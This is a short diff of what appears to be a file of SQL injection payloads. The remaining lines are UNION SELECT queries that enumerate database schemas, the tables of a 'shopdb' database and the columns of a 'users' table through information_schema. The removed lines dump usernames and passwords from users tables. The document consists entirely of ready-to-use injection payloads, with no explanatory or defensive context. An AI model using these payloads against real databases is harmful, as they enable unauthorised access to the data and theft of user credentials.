@@ -1,9 +1,6 @@
 0 UNION SELECT NULL, NULL, NULL, SCHEMA_NAME FROM information_schema.SCHEMATA --
 0 UNION SELECT NULL,NULL,NULL,group_concat(TABLE_name) FROM information_schema.TABLES Where TABLE_SCHEMA='shopdb' --
 0 UNION SELECT NULL, NULL, NULL, group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME='users' --
-1 UNION SELECT NULL, group_concat(username), group_concat(password), NULL FROM users --
-
-1 UNION SELECT NULL, group_concat(username), group_concat(password), NULL FROM testdb.users --
 
 
 
